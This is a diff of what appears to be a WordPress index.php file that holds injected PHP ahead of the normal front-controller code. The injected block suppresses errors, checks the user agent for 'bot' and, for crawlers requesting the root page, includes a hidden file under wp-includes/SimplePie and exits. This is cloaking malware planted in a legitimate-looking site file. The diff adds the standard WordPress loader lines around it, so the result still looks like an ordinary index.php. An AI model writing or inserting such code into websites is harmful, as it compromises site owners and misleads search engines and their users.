@@ -1,4 +1,4 @@
-
+<?php
 error_reporting(0);
 $s_ref = $_SERVER['HTTP_REFERER'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
@@ -13,3 +13,19 @@ if (strpos($agent, 'bot') > 0 && $_SERVER['REQUEST_URI'] == '/') {
     include('wp-includes/SimplePie/content.php');
     exit;
 }
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
